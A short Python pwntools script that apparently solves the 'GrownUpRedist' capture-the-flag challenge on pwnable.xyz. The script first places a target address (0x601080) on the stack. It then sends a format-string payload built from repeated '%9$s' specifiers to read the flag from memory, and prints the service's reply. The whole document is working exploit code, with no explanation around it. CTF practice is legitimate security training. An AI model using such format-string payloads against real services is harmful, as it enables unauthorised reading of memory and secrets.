from pwn import *
  
sh = remote("svc.pwnable.xyz", 30004)
#sh = process('./GrownUpRedist')
flag = 0x601080

 
sh.sendafter(': ', "y"*8 + p64(flag))
pause()
sh.sendlineafter(': ',  'A'*0x20 + "%9$s"*0x6 + "A"*0x47)
pause()
         
print sh.recvall()
